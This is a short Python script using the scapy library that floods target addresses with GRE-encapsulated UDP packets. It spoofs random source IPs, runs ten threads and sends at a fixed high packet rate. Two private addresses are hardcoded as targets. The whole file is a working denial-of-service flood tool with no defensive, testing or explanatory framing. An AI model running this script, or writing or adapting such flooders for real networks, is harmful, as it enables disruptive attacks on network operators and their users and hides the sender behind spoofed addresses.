from scapy.all import IP, sendpfast, GRE, UDP, Raw
import random
import threading

def create_gre_ip_packet(source_ip, dest_ip, gre_protocol, data_len=512, ttl=64):
    ip = IP(src=source_ip, dst=dest_ip, ttl=ttl)
    gre = GRE(proto=gre_protocol)
    
    inner_ip = IP(src=random_ip(), dst=dest_ip, ttl=ttl)
    udp = UDP(sport=random.randint(1024, 65535), dport=random.randint(1024, 65535))
    udp.len = data_len + len(udp)
    
    payload = Raw(load="X" * data_len)
    packet = ip/gre/inner_ip/udp/payload
    
    return packet

def send_gre_ip_packets(target_ips, num_packets=10, num_threads=10):
    def send_packets():
        for _ in range(num_packets):
            for target_ip in target_ips:
                source_ip = random_ip()
                packet = create_gre_ip_packet(source_ip, target_ip, gre_protocol=0x0800)
                sendpfast(packet, pps=1000, verbose=False)
    
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_packets)
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

target_ips = ["192.168.1.1", "192.168.1.2"]
send_gre_ip_packets(target_ips, num_packets=1000, num_threads=10)
